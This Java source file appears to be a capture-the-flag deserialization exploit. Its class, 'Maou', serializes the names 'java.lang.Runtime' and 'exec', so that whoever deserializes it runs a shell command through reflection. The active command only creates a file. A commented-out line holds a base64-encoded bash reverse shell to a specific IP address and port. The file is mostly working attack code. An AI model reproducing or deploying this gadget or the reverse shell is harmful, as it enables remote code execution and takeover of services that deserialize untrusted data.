package com.cat;


import com.cat.Cat;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;

public class Maou implements Serializable {

    static final long serialVersionUID = 2952304742572984796L;

//    String[] DEMON_NAMES = new String[] {"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuMzcuMzUuMjA1Lzc3NzcgMD4mMQ==}|{base64,-d}|{bash,-i}"};
    String[] DEMON_NAMES = new String[] {"touch zxd.txt"};

    String CAT_NAME_SETTER = "exec";

    String name = "(unnamed)";

    ArrayList<Cat> cats = new ArrayList<>();

    public Maou(String name) {
        this.name = name;

    }


    public String getName() {
        return this.name;
    }

    public ArrayList<Cat> getCats() {
        return this.cats;
    }

    private String genCatName() {
        int len = this.DEMON_NAMES.length;
        return this.DEMON_NAMES[(int)(Math.random() * len)];
    }

    private void writeObject(ObjectOutputStream stream) throws IOException {
        stream.writeObject(this.DEMON_NAMES);
        stream.writeObject(this.CAT_NAME_SETTER);
        stream.writeObject(this.name);
        ArrayList<String> catsClass = new ArrayList<>();
        catsClass.add("java.lang.Runtime");
        stream.writeObject(catsClass);
    }

    private void readObject(ObjectInputStream stream) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException {
        this.DEMON_NAMES = (String[])stream.readObject();
        this.CAT_NAME_SETTER = (String)stream.readObject();
        this.name = (String)stream.readObject();
        this.cats = new ArrayList<>();
        ArrayList<String> catClsStrings = (ArrayList<String>)stream.readObject();
        for (String catCls : catClsStrings) {
            String[] parts = catCls.split("\\.");
            String typeName = parts[parts.length - 1];
            Class<?> cls = Class.forName(catCls);
            Method method = cls.getMethod(this.CAT_NAME_SETTER, new Class[] { String.class });
            Constructor<?> constructor = cls.getDeclaredConstructor(new Class[0]);
            constructor.setAccessible(true);
            Object cat = constructor.newInstance(new Object[0]);
            method.invoke(cat, new Object[] { genCatName() + "-" + typeName });
            this.cats.add((Cat)cat);
        }
    }
}

